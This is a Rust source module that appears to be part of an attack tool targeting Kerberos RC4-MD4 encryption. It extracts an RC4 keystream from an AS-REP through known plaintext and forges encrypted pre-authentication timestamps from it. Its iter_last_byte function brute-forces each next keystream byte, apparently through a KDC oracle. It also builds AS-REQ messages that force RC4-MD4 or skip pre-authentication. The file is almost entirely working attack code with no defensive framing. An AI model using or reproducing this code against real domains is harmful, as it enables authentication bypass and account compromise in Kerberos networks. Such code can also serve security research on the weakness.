use std::{fmt, io};

use bytes::Bytes;
use chrono::{TimeZone, Utc};
use hex_literal::hex;
use itertools::repeat_n;
use rasn::der;
use rasn_kerberos::{
    AsRep, AsReq, EncryptedData, HostAddress, KdcOptions, KdcReq, KdcReqBody, KerberosFlags,
    KerberosString, KerberosTime, PaData, PaEncTimestamp, PrincipalName,
};
use rc4::{KeyInit, Rc4, StreamCipher};

use crate::{
    xor, NtHash, ETYPE_AES128_CTS_HMAC_SHA1_96, ETYPE_AES256_CTS_HMAC_SHA1_96, ETYPE_RC4_MD4,
    PA_ENC_TIMESTAMP, PA_PAC_REQUEST,
};

pub struct Keystream(Vec<u8>);

impl Keystream {
    pub fn generate(nt_hash: &[u8; 16], length: usize) -> Self {
        let mut key = [0u8; 8];
        key.copy_from_slice(&nt_hash[..8]);
        let mut rc4 = Rc4::new(&key.into());
        let mut buf: Vec<u8> = repeat_n(0u8, length).collect();
        rc4.apply_keystream(&mut buf);
        Keystream(buf)
    }

    pub fn from_as_rep_aes128(as_rep: &AsRep) -> io::Result<Self> {
        let ciphertext = as_rep.get_rc4_md4_enc_part().ok_or_else(|| {
            io::Error::new(
                io::ErrorKind::InvalidData,
                "Failed to extract keystream from AS_REP",
            )
        })?;
        let mut plaintext = [0u8; 24].to_vec();
        // plaintext.extend_from_slice(&[0x79, 0x82]);
        // plaintext.extend_from_slice(&(ciphertext.len() as u16 - 28).to_be_bytes());
        // plaintext.extend_from_slice(&[0x30, 0x82]);
        // plaintext.extend_from_slice(&(ciphertext.len() as u16 - 32).to_be_bytes());
        plaintext.push(0x79);
        let len_1 = ciphertext.len() - 28;
        match len_1 {
            0..=127 => plaintext.push(len_1 as u8),
            128..=255 => {
                plaintext.push(0x81);
                plaintext.push(len_1 as u8);
            }
            256..=65535 => {
                plaintext.push(0x82);
                plaintext.push((len_1 >> 8) as u8);
                plaintext.push(len_1 as u8);
            }
            _ => panic!("AS_REP shouldn't be this large!"),
        }
        plaintext.push(0x30);
        let len_2 = ciphertext.len() - 32;
        match len_2 {
            0..=127 => plaintext.push(len_2 as u8),
            128..=255 => {
                plaintext.push(0x81);
                plaintext.push(len_2 as u8);
            }
            256..=65535 => {
                plaintext.push(0x82);
                plaintext.push((len_2 >> 8) as u8);
                plaintext.push(len_2 as u8);
            }
            _ => panic!("AS_REP shouldn't be this large!"),
        }
        plaintext.extend_from_slice(&[
            0xa0, 0x1b, 0x30, 0x19, 0xa0, 0x03, 0x02, 0x01, 0x11, 0xa1, 0x12, 0x04, 0x10,
        ]);
        //dbg!(&plaintext.hex_dump());

        Ok(Self(xor(&plaintext, &ciphertext)))
    }

    pub fn len(&self) -> usize {
        self.0.len()
    }

    pub fn apply(&self, buf: &mut Vec<u8>) {
        assert!(buf.len() <= self.len());
        buf.iter_mut().zip(self.0.iter()).for_each(|(b, k)| *b ^= k);
    }

    pub fn push(&mut self, byte: u8) {
        self.0.push(byte)
    }
}

impl AsRef<[u8]> for Keystream {
    fn as_ref(&self) -> &[u8] {
        self.0.as_ref()
    }
}

impl fmt::Debug for Keystream {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "Keystream(0x")?;
        let _ = &self
            .0
            .iter()
            .take(8)
            .map(|b| write!(f, "{:02x?}", b))
            .collect::<fmt::Result>()?;
        write!(f, " Length={})", &self.0.len())
    }
}

impl From<Vec<u8>> for Keystream {
    fn from(inner: Vec<u8>) -> Self {
        Keystream(inner)
    }
}

pub struct EncryptedTimestamp(Bytes);

impl AsRef<[u8]> for EncryptedTimestamp {
    fn as_ref(&self) -> &[u8] {
        self.0.as_ref()
    }
}

impl From<EncryptedTimestamp> for Bytes {
    fn from(encrypted_timestamp: EncryptedTimestamp) -> Self {
        encrypted_timestamp.0
    }
}

impl EncryptedTimestamp {
    pub fn now(keystream: &Keystream) -> Self {
        assert!(keystream.len() >= 45);
        let ascii = format!("{}", Utc::now().format("%Y%m%d%H%M%SZ")).into_bytes();
        let mut buf = [0u8; 24].to_vec();
        buf.push(0x30);
        if keystream.len() > 45 {
            buf.push(0x80 ^ (keystream.len() - 45) as u8);
            buf.extend(repeat_n(0u8, keystream.len() - 46));
        }
        buf.extend_from_slice(&[0x13, 0xa0, 0x11, 0x18, 0x0f]);
        buf.extend(ascii);
        //dbg!(&buf.hex_dump());
        keystream.apply(&mut buf);
        EncryptedTimestamp(buf.into())
    }

    pub fn now_from_password(password: &str) -> Self {
        let nthash = NtHash::from(password);
        let keystream = Keystream::generate(nthash.as_ref(), 45);
        // let ascii = format!("{}", Utc::now().format("%Y%m%d%H%M%SZ")).into_bytes();
        // let mut buf = [0u8; 24].to_vec();
        // buf.extend_from_slice(&[0x30, 0x1a, 0xa0, 0x11, 0x18, 0x0f]);
        // buf.extend(ascii);
        // // Millis
        // buf.extend_from_slice(&[0xa1, 0x05, 0x02, 0x03, 0x0d, 0xe3, 0x75]);
        // //dbg!(&buf.hex_dump());
        // keystream.apply(&mut buf);
        // EncryptedTimestamp(buf.into())
        Self::now(&keystream)
    }

    pub fn stretch(nthash: &[u8; 16]) -> Self {
        let mut key = [0u8; 8];
        key.copy_from_slice(&nthash[..8]);
        let mut rc4 = Rc4::new(&key.into());
        let mut buf = [0u8; 24].to_vec();
        buf.extend_from_slice(
            hex!(
                "30 84 00 00  00 20 a0 84  00 00 00 15  18 84 00 00"
                "00 0f"
            )
            .as_slice(),
        );
        let ascii = format!("{}", Utc::now().format("%Y%m%d%H%M%SZ")).into_bytes();
        buf.extend_from_slice(&ascii);
        //buf.push(0x00);
        buf.extend_from_slice(hex!("a1 03 02 01 00").as_slice());
        rc4.apply_keystream(&mut buf);
        EncryptedTimestamp(buf.into())
    }

    pub fn iter_last_byte(keystream: &Keystream) -> impl Iterator<Item = (Self, u8)> {
        assert!(keystream.len() >= 45);
        let ascii = format!("{}", Utc::now().format("%Y%m%d%H%M%SZ")).into_bytes();
        let mut buf = [0u8; 24].to_vec();
        buf.push(0x30);
        match keystream.len() {
            45 => {
                buf.extend_from_slice(&[0x14, 0xa0, 0x12, 0x18, 0x10]);
            }
            46..=49 => {
                buf.push(0x80 ^ (keystream.len() - 45) as u8);
                buf.extend(repeat_n(0u8, keystream.len() - 46));
                buf.extend_from_slice(&[0x14, 0xa0, 0x12, 0x18, 0x10]);
            }
            50..=53 => {
                buf.extend_from_slice(&[0x84, 0x00, 0x00, 0x00]);
                buf.push(keystream.len() as u8 - 29);
                buf.push(0xa0);
                buf.push(0x80 ^ (keystream.len() - 49) as u8);
                buf.extend(repeat_n(0u8, keystream.len() - 50));
                buf.extend_from_slice(&[0x12, 0x18, 0x10]);
            }
            54..=57 => {
                buf.extend_from_slice(&[0x84, 0x00, 0x00, 0x00]);
                buf.push(keystream.len() as u8 - 29);
                buf.extend_from_slice(&[0xa0, 0x84, 0x00, 0x00, 0x00]);
                buf.push(keystream.len() as u8 - 35);
                buf.push(0x18);
                buf.push(0x80 ^ (keystream.len() - 53) as u8);
                buf.extend(repeat_n(0u8, keystream.len() - 54));
                buf.push(0x10);
            }
            58..=60 => {
                buf.push(0x80 ^ (keystream.len() - 56) as u8);
                buf.extend(repeat_n(0u8, keystream.len() - 57));
                buf.push(0x20);
                //buf.extend_from_slice(&[0x81, 0x20]);
                buf.extend_from_slice(&[0xa0, 0x84, 0x00, 0x00, 0x00, 0x15]);
                buf.extend_from_slice(&[0x18, 0x84, 0x00, 0x00, 0x00, 0x0f]);
            }
            _ => unreachable!(),
        }
        buf.extend(ascii);
        let millis = keystream.len() >= 58;
        if millis {
            buf.extend_from_slice(&[0xa1, 0x03, 0x02]);
        }
        //dbg!(&buf.hex_dump());
        keystream.apply(&mut buf);
        (0u8..=255).map(move |last| {
            let mut inner = Vec::new();
            inner.extend_from_slice(&buf);
            inner.push(last);
            let key_byte_candidate = if millis {
                inner.push(0x00); // plaintext milliseconds value shouldn't matter
                last ^ 0x01
            } else {
                last
            };
            (EncryptedTimestamp(inner.into()), key_byte_candidate)
        })
    }
}
pub trait AsReqExt {
    fn new_rc4md4(realm: String, username: String, password: String) -> Self;
    fn new_rc4md4_without_preauth(realm: String, username: String) -> Self;
    fn new_rc4md4_with_ts(realm: String, username: String, enc_ts: Bytes) -> Self;
    fn get_pa_enc_timestamp(&self) -> Option<PaEncTimestamp>;
    fn get_rc4md4_timestamp(&self) -> Option<Bytes>;
}

impl AsReqExt for AsReq {
    fn new_rc4md4(realm: String, username: String, password: String) -> Self {
        let enc_ts = EncryptedTimestamp::now_from_password(&password);
        Self::new_rc4md4_with_ts(realm, username, enc_ts.into())
    }

    fn new_rc4md4_without_preauth(realm: String, username: String) -> Self {
        Self(KdcReq {
            pvno: 5.into(),
            msg_type: 10.into(),
            padata: Some(vec![PaData {
                r#type: PA_PAC_REQUEST,
                value: hex!("3005a0030101ff").as_ref().into(),
            }]),
            req_body: KdcReqBody {
                kdc_options: KdcOptions(KerberosFlags::from_slice(b"\x40\x81\x00\x10")),
                cname: Some(PrincipalName {
                    r#type: 1,
                    string: vec![KerberosString::new(username)],
                }),
                realm: KerberosString::new(realm.to_owned()),
                sname: Some(PrincipalName {
                    r#type: 2,
                    string: vec![
                        KerberosString::new("krbtgt".to_owned()),
                        KerberosString::new(realm),
                    ],
                }),
                from: None,
                till: KerberosTime(Utc.timestamp_nanos(0).into()),
                rtime: Some(KerberosTime(Utc.timestamp_nanos(0).into())),
                nonce: 3,
                etype: vec![ETYPE_RC4_MD4],
                addresses: None,
                enc_authorization_data: None,
                additional_tickets: None,
            },
        })
    }

    fn new_rc4md4_with_ts(realm: String, username: String, enc_ts: Bytes) -> Self {
        Self(KdcReq {
            pvno: 5.into(),
            msg_type: 10.into(),
            padata: Some(vec![
                PaData {
                    r#type: PA_ENC_TIMESTAMP,
                    value: der::encode(&EncryptedData {
                        etype: ETYPE_RC4_MD4,
                        kvno: None,
                        cipher: enc_ts,
                    })
                    .unwrap()
                    .into(),
                },
                PaData {
                    r#type: PA_PAC_REQUEST,
                    value: hex!("3005a0030101ff").as_ref().into(),
                },
            ]),
            req_body: KdcReqBody {
                kdc_options: KdcOptions(KerberosFlags::from_slice(b"\x40\x81\x00\x10")),
                cname: Some(PrincipalName {
                    r#type: 1,
                    string: vec![KerberosString::new(username)],
                }),
                realm: KerberosString::new(realm.to_owned()),
                sname: Some(PrincipalName {
                    r#type: 2,
                    string: vec![
                        KerberosString::new("krbtgt".to_owned()),
                        KerberosString::new(realm),
                    ],
                }),
                from: None,
                till: KerberosTime(Utc.timestamp_nanos(2136422885_000_000_000).into()),
                //till: KerberosTime(Utc.timestamp_nanos(0).into()),
                rtime: Some(KerberosTime(
                    Utc.timestamp_nanos(2136422885_000_000_000).into(),
                )),
                //rtime: Some(KerberosTime(Utc.timestamp_nanos(0).into())),
                nonce: 12345678,
                //etype: vec![ETYPE_RC4_MD4],
                //etype: vec![ETYPE_AES128_CTS_HMAC_SHA1_96, ETYPE_RC4_HMAC_MD5],
                etype: vec![ETYPE_AES128_CTS_HMAC_SHA1_96],
                //etype: vec![ETYPE_AES256_CTS_HMAC_SHA1_96],
                addresses: Some(vec![HostAddress {
                    addr_type: HostAddress::NET_BIOS,
                    address: b"WORKSTATION".as_ref().into(),
                }]),
                enc_authorization_data: None,
                additional_tickets: None,
            },
        })
    }

    fn get_pa_enc_timestamp(&self) -> Option<PaEncTimestamp> {
        let padata_entries = self.0.padata.as_ref()?;
        let entry = padata_entries
            .iter()
            .filter(|e| e.r#type == PA_ENC_TIMESTAMP)
            .next()?;
        let pa_enc_timestamp: PaEncTimestamp = der::decode(&entry.value).ok()?;
        Some(pa_enc_timestamp)
    }

    fn get_rc4md4_timestamp(&self) -> Option<Bytes> {
        let pa_enc_timestamp = self.get_pa_enc_timestamp()?;
        match pa_enc_timestamp.etype {
            ETYPE_RC4_MD4 => Some(pa_enc_timestamp.cipher),
            _ => None,
        }
    }
}

pub trait AsRepExt {
    fn get_etype(&self) -> i32;
    fn get_rc4_md4_enc_part(&self) -> Option<Bytes>;
}

impl AsRepExt for AsRep {
    fn get_etype(&self) -> i32 {
        self.0.enc_part.etype
    }

    fn get_rc4_md4_enc_part(&self) -> Option<Bytes> {
        match &self.0.enc_part {
            EncryptedData {
                etype: ETYPE_RC4_MD4,
                kvno: _,
                cipher,
            } => Some(cipher.clone()),
            _ => None,
        }
    }
}

#[cfg(test)]
mod tests {
    //use super::*;
}
